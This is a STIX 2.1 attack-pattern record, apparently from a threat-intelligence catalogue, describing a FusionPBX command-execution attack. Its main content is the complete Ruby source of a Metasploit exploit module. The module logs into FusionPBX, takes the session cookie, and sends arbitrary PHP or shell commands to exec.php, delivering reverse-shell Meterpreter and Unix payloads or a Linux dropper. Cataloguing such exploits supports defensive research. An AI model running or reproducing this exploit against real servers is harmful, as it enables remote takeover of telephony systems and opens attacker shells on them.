{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--109c42dc-1c85-4cb7-9e86-3853b15b8eac",
    "created": "2024-08-14T17:12:46.898315Z",
    "modified": "2024-08-14T17:12:46.89832Z",
    "name": "FusionPBX Command exec.php Command Execution",
    "description": " This module uses administrative functionality available in FusionPBX to gain a shell.  The Command section of the application permits users with `exec_view` permissions, or superadmin permissions, to execute arbitrary system commands, or arbitrary PHP code, as the web server user.  This module has been tested successfully on FusionPBX version 4.4.1 on Ubuntu 19.04 (x64).  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/fusionpbx_exec_cmd_exec.rb",
            "external_id": "fusionpbx_exec_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.fusionpbx.com/en/latest/advanced/command.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'FusionPBX Command exec.php Command Execution',\n      'Description'     => %q{\n        This module uses administrative functionality available in FusionPBX\n        to gain a shell.\n\n        The Command section of the application permits users with `exec_view`\n        permissions, or superadmin permissions, to execute arbitrary system\n        commands, or arbitrary PHP code, as the web server user.\n\n        This module has been tested successfully on FusionPBX version\n        4.4.1 on Ubuntu 19.04 (x64).\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          => ['bcoles'],\n      'References'      =>\n        [\n          ['URL', 'https://docs.fusionpbx.com/en/latest/advanced/command.html']\n        ],\n      'Platform'        => %w[php linux unix],\n      'Arch'            => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Targets'         =>\n        [\n          ['Automatic (PHP In-Memory)',\n            'Platform'       => 'php',\n            'Arch'           => ARCH_PHP,\n            'DefaultOptions' => {'PAYLOAD' => 'php/meterpreter/reverse_tcp'},\n            'Type'           => :php_memory\n          ],\n          ['Automatic (Unix In-Memory)',\n            'Platform'       => 'unix',\n            'Arch'           => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},\n            'Type'           => :unix_memory\n          ],\n          ['Automatic (Linux Dropper)',\n            'Platform'       => 'linux',\n            'Arch'           => [ARCH_X86, ARCH_X64],\n            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},\n            'Type'           => :linux_dropper\n          ]\n        ],\n      'Privileged'      => false,\n      'DefaultOptions'  => { 'SSL' => true, 'RPORT' => 443 },\n      'DisclosureDate'  => '2019-11-02',\n      'DefaultTarget'   => 0))\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to FusionPBX', '/']),\n      OptString.new('USERNAME', [true, 'The username for FusionPBX', 'admin']),\n      OptString.new('PASSWORD', [true, 'The password for FusionPBX'])\n    ]\n  end\n\n  def login(user, pass)\n    vprint_status \"Authenticating as user '#{user}'\"\n\n    vars_post = {\n      username: user,\n      password: pass,\n      path: ''\n    }\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'core/user_settings/user_dashboard.php'),\n      'vars_post' => vars_post\n    })\n\n    unless res\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    if res.code == 302 && res.headers['location'].include?('login.php')\n      fail_with Failure::NoAccess, \"Login failed for user '#{user}'\"\n    end\n\n    unless res.code == 200\n      fail_with Failure::UnexpectedReply, \"Unexpected HTTP response status code #{res.code}\"\n    end\n\n    cookie = res.get_cookies.to_s.scan(/PHPSESSID=(.+?);/).flatten.first\n\n    unless cookie\n      fail_with Failure::UnexpectedReply, 'Failed to retrieve PHPSESSID cookie'\n    end\n\n    print_good \"Authenticated as user '#{user}'\"\n\n    cookie\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.body.include?('FusionPBX')\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts = {})\n    vars_post = {\n      handler: 'php',\n      table_name: '',\n      sql_type: '',\n      id: '',\n      cmd: cmd\n    }\n\n    case opts[:handler]\n    when 'php'\n      vars_post[:handler] = 'php'\n    when 'shell'\n      vars_post[:handler] = 'shell'\n    when 'switch'\n      vars_post[:handler] = 'switch'\n      vars_post[:cmd] = \"bg_system #{cmd}\"\n    else\n      vars_post[:handler] = 'shell'\n    end\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'app/exec/exec.php'),\n      'cookie'    => \"PHPSESSID=#{@cookie}\",\n      'vars_post' => vars_post\n    }, 5)\n\n    unless res\n      return if session_created?\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    unless res.code == 200\n      fail_with Failure::UnexpectedReply, \"Unexpected HTTP response status code #{res.code}\"\n    end\n\n    if res.body.include? 'access denied'\n      fail_with Failure::NoAccess, \"User #{datastore['USERNAME']} does not have permission to execute #{vars_post[:handler]} #{vars_post[:handler].eql?('php') ? 'code' : 'commands'}\"\n    end\n\n    res\n  end\n\n  def exploit\n    unless check == CheckCode::Detected\n      fail_with Failure::NotVulnerable, \"#{peer} - Target is not vulnerable\"\n    end\n\n    @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    print_status \"Sending payload (#{payload.encoded.length} bytes) ...\"\n\n    case target['Type']\n    when :php_memory\n      execute_command(payload.encoded, handler: 'php')\n    when :unix_memory\n      execute_command(payload.encoded, handler: 'shell')\n    when :linux_dropper\n      execute_cmdstager(:linemax => 1_500, handler: 'shell')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}